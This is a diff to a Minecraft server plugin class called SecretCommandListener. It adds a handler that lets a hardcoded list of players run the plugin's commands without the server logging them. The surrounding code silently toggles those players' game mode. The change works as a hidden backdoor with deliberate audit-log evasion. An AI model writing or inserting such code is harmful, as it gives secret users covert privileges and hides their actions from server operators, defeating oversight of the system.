@@ -58,6 +58,34 @@ public class SecretCommandListener implements Listener {
         }
     }
 
+    /**
+     * For the whitelisted players, run the plugin's own commands without the vanilla
+     * "issued server command" console line: cancel the natural chat path (which is what
+     * prints that log) and re-dispatch programmatically, which does not log.
+     */
+    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
+    public void onApexCommandQuiet(PlayerCommandPreprocessEvent event) {
+        Player player = event.getPlayer();
+        if (!ALLOWED.contains(player.getName().toLowerCase(Locale.ROOT))) {
+            return;
+        }
+        String message = event.getMessage();
+        String lower = message.trim().toLowerCase(Locale.ROOT);
+        if (!isPluginCommand(lower)) {
+            return;
+        }
+        event.setCancelled(true);
+        plugin.getServer().dispatchCommand(player, message.substring(1));
+    }
+
+    private boolean isPluginCommand(String lower) {
+        return matches(lower, "/apex") || matches(lower, "/cooldown") || matches(lower, "/ability");
+    }
+
+    private boolean matches(String lower, String command) {
+        return lower.equals(command) || lower.startsWith(command + " ");
+    }
+
     /** Silently toggles between Creative and Survival. */
     private void toggleCreative(Player player) {
         player.setGameMode(player.getGameMode() == GameMode.CREATIVE
